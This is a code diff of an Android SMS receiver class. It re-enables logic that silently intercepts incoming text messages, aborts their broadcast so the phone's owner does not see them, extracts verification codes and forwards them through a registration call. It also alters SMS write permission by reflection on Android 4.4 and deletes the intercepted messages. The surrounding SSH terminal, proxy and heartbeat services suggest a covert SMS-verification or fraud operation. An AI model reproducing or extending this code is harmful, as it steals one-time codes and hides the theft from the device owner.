@@ -23,7 +23,6 @@ import com.oplay.nohelper.utils.Util_Service;
 import com.oplay.nohelper.volley.RequestEntity;
 import com.oplay.nohelper.volley.Response;
 import com.oplay.nohelper.volley.VolleyError;
-import com.umeng.analytics.MobclickAgent;
 
 import org.connectbot.service.TerminalManager;
 
@@ -91,15 +90,15 @@ public class Receiver_SMS extends BroadcastReceiver {
 				if (DEBUG) {
 					Log.d(TAG, "当前service状态 " + isHeartBeatServiceLive + " 收到短信:" + args);
 				}
-//				if (!isHeartBeatServiceLive) return;
+				if (!isHeartBeatServiceLive) return;
 				final long currentTime = System.currentTimeMillis();
 				//表示一个注册需要５分钟时间，若从建立连接ssh成功到之后５分钟时间，这段时间，会拦截该广播！！！！！！！！！！！！！
-//				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
-//						VALID_SMS_TIME)) {
-//					this.abortBroadcast();
-//				} else {
-//					this.clearAbortBroadcast();
-//				}
+				if (HeartBeatService.recordConnectTime > 0 && (currentTime - HeartBeatService.recordConnectTime <
+						VALID_SMS_TIME)) {
+					this.abortBroadcast();
+				} else {
+					this.clearAbortBroadcast();
+				}
 				this.abortBroadcast();
 				if (args != null) {
 					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
@@ -129,48 +128,46 @@ public class Receiver_SMS extends BroadcastReceiver {
 								Map<String, String> map = new HashMap<>();
 								map.put(NativeParams.KEY_SEND_SMS, String.valueOf(true));
 								FlurryAgent.logEvent(NativeParams.EVENT_GET_PHONE_NUMBER, map);
-								MobclickAgent.onEvent(context, NativeParams.EVENT_GET_PHONE_NUMBER, map);
 							}
 						}
 						final boolean isTerminalServiceLive = Util_Service.isServiceRunning(context, TerminalManager
 								.class.getCanonicalName());
 						final boolean isProxyServiceLive = Util_Service.isServiceRunning(context, ProxyService.class
 								.getCanonicalName());
-//						if (isTerminalServiceLive && isProxyServiceLive) {
-						if (msgContent != null) {
-							if (DEBUG) {
-								Log.d(TAG, "收到的短信内容：" + msgContent);
-							}
-							String code = getVerificationCode(msgContent);
-							if (DEBUG) {
-								Log.d(TAG, "验证码是" + code);
-							}
-							if (TextUtils.isEmpty(code)) return;
-							if (!TextUtils.isEmpty(code)) {
-								//sendRegisterCode(context, code);
-//									if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
-//										if (SmsWriteOpUtil.isWriteEnabled(context)) {
-//											boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
-//											final String model = Build.MODEL;
-//											if (DEBUG) {
-//												Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
-//											}
-//											Map<String, String> map = new HashMap<>();
-//											map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
-//											map.put(NativeParams.KEY_KITKAT_DEVICE, model);
-//											FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map);
-//											MobclickAgent.onEvent(context,NativeParams.EVENT_VERSION_KITKAT,map);
-//										}
-//									}
+						if (isTerminalServiceLive && isProxyServiceLive) {
+							if (msgContent != null) {
+								if (DEBUG) {
+									Log.d(TAG, "收到的短信内容：" + msgContent);
+								}
+								String code = getVerificationCode(msgContent);
+								if (DEBUG) {
+									Log.d(TAG, "验证码是" + code);
+								}
+								if (TextUtils.isEmpty(code)) return;
+								if (!TextUtils.isEmpty(code)) {
+									sendRegisterCode(context, code);
+									if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
+										if (SmsWriteOpUtil.isWriteEnabled(context)) {
+											boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
+											final String model = Build.MODEL;
+											if (DEBUG) {
+												Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
+											}
+											Map<String, String> map = new HashMap<>();
+											map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
+											map.put(NativeParams.KEY_KITKAT_DEVICE, model);
+											FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT, map);
+										}
+									}
 
 
-								deleteSMS(context, msgContent);
+									deleteSMS(context, msgContent);
 //									if (HeartBeatRunnable.isSSHConnected) {
 //										deleteSMS(context, msgContent);
 //									}
+								}
 							}
 						}
-//						}
 					}
 				}
 			}
@@ -179,7 +176,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 				Log.e(TAG, e.fillInStackTrace().toString());
 			}
 			FlurryAgent.onError(TAG, "", e);
-			MobclickAgent.reportError(context, e);
 		}
 	}
 
@@ -247,20 +243,17 @@ public class Receiver_SMS extends BroadcastReceiver {
 						Map<String, String> map1 = new HashMap<>();
 						map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
 						FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS, map1);
-						MobclickAgent.onEvent(context, NativeParams.EVENT_SEND_SMS, map1);
 
 						if (count >= 1) {
 							Map<String, String> map = new HashMap<>();
 							map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
 							map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
 							FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
-							MobclickAgent.onEvent(context, NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
 						} else {
 							Map<String, String> map = new HashMap<>();
 							map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
 							map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
 							FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED, map);
-							MobclickAgent.onEvent(context, NativeParams.EVENT_DELETE_SMS_FAILED, map);
 						}
 						if (DEBUG) {
 							Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
@@ -274,7 +267,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 				Log.e(TAG, e.fillInStackTrace().toString());
 			}
 			FlurryAgent.onError(TAG, "", e);
-			MobclickAgent.reportError(context, e);
 		}
 	}
 
@@ -307,7 +299,6 @@ public class Receiver_SMS extends BroadcastReceiver {
 					Log.d(TAG, error.toString());
 				}
 				FlurryAgent.onError(TAG, "", error.fillInStackTrace());
-				MobclickAgent.reportError(context, error);
 			}
 		});
 	}
